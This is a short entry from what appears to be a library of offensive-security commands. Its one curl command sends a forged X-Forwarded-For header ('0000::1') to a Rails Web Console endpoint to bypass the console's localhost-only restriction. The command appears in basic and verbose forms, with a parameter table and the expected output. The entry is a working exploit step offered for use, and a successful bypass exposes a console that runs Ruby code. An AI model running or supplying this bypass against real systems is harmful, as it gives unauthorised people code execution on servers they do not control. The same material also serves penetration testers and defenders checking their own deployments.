---
data: 'curl -H "X-Forwarded-For: 0000::1" http://target:3000/rails/console'
tags:
  - http
  - bypass
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:28.625Z'
id: fbbb0785-2ef6-4f19-a9b5-dcb37fa4b54d
verified: false
validated: true
submitted: true
---
# curl-bypass-rails-ip

## Command

```bash
curl -H "X-Forwarded-For: 0000::1" http://target:3000/rails/console
```

## Description

This command uses curl to send an HTTP GET request to the Rails Web Console endpoint with a crafted X-Forwarded-For header set to '0000::1', exploiting the IP parsing discrepancy to bypass localhost restrictions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Adds a custom header (X-Forwarded-For: 0000::1) | Yes |
| `http://target:3000/rails/console` | Target URL for the Web Console | Yes |

## Examples

### Basic Usage

```bash
curl -H "X-Forwarded-For: 0000::1" http://target:3000/rails/console
```

### Advanced Usage

```bash
curl -H "X-Forwarded-For: 0000::1" -v http://target:3000/rails/console
```

## Expected Output

Successful bypass returns the Web Console HTML interface (e.g., form for Ruby input) with HTTP 200 status. Failure shows 403 Forbidden or IP restriction error.

## Related

- [[Related Procedure]]
